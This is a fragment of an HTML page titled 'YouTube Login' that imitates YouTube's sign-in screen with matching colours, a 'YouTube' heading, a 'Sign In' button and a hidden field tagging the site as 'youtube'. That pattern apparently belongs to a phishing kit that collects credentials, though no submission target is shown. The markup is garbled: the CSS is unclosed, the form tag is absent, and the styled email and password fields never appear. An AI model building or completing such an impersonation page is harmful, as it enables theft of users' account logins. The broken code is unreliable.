<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>YouTube Login</title>
  <style>
    /* (Same CSS as before) */
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;

      align-items: center;
      height: 100vh;

    .login-container {
      background: white;
      padding: 40px;

      text-align: center;
    }
    .login-container h1 {
      color: #cc0000;
      margin-bottom: 24px;
      font-size: 28px;
      font-weight: bold;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px 12px;
      margin: 12px 0;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 4px;
      box-sizing: border-box;
    }
    input[type="submit"] {
      width: 100%;
      padding: 14px;
      background-color: #cc0000;
      border: none;

    }
    .footer-text a {

<body>
  <div class="login-container">
    <h1>YouTube</h1>

      <input type="hidden" name="site" value="youtube" />

      <input type="submit" value="Sign In" />
